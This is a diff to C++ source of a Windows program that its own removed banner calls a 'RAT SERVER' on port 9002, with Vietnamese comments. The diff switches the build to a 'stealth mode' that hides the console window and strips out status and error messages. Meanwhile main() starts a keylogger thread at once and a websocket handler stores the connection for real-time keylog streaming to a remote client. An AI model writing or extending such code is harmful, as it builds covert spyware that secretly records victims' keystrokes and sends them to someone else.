@@ -3,13 +3,24 @@
 // =================================================================================
 // ✅ SHOW_CONSOLE = true  → Hiện cửa sổ console (dùng khi debug/development)
 // ❌ SHOW_CONSOLE = false → Ẩn console (dùng khi deploy/stealth mode)
-#define SHOW_CONSOLE true
+#define SHOW_CONSOLE false
 // =================================================================================
 
 #if !SHOW_CONSOLE
     // Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
     #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #endif
+
+// =================================================================================
+// ⚙️ MACRO ĐIỀU KHIỂN DEBUG OUTPUT
+// =================================================================================
+// Khi SHOW_CONSOLE = false, tất cả lệnh DEBUG_LOG sẽ bị vô hiệu hóa (không chạy)
+#if SHOW_CONSOLE
+    #define DEBUG_LOG(x) std::cout << x
+#else
+    #define DEBUG_LOG(x) ((void)0)  // Không làm gì cả - tối ưu hoàn toàn
+#endif
+// =================================================================================
 
 #include "Global.h"
 #include "SystemManager.h"
@@ -632,16 +643,13 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
         }
     }
     catch (std::exception& e) {
-        std::cout << "[ERROR] Loi xu ly tin nhan: " << e.what() << std::endl;
     }
     catch (...) {
-        std::cout << "[ERROR] Loi khong xac dinh!" << std::endl;
     }
 }
 
 // --- SỰ KIỆN KHI CÓ KẾT NỐI MỚI ---
 void on_open(server* s, websocketpp::connection_hdl hdl) {
-    std::cout << ">>> Client CONNECTED (Ket noi thanh cong)" << std::endl;
     
     // Lưu thông tin connection để dùng cho real-time keylog
     g_ClientHdl = hdl;
@@ -650,7 +658,6 @@ void on_open(server* s, websocketpp::connection_hdl hdl) {
 
 // --- SỰ KIỆN KHI NGẮT KẾT NỐI ---
 void on_close(server* s, websocketpp::connection_hdl hdl) {
-    std::cout << "<<< Client DISCONNECTED (Ngat ket noi)" << std::endl;
     
     // Reset connection state
     g_ClientConnected = false;
@@ -675,7 +682,6 @@ int main() {
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
     //std::string myIP = GetLocalIPAddress();
-    //std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
     //// Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
     //std::ofstream ipFile("server_ip.txt");
     //if (ipFile.is_open()) {
@@ -684,11 +690,6 @@ int main() {
     //    ipFile << "Copy IP nay va nhap vao Web Client.";
     //    ipFile.close();
     //}
-
-    std::cout << "==========================================" << std::endl;
-    std::cout << "   RAT SERVER                             " << std::endl;
-    std::cout << "   Port: 9002                             " << std::endl;
-    std::cout << "==========================================" << std::endl;
 
     // 3. Khởi động Keylogger (Chạy ngầm ngay lập tức)
     StartKeyloggerThread();
@@ -719,7 +720,6 @@ int main() {
         echo_server.run();
     }
     catch (std::exception const& e) {
-        std::cout << "[FATAL ERROR] Loi Server: " << e.what() << std::endl;
     }
 
     // 5. Dọn dẹp tài nguyên khi tắt chương trình
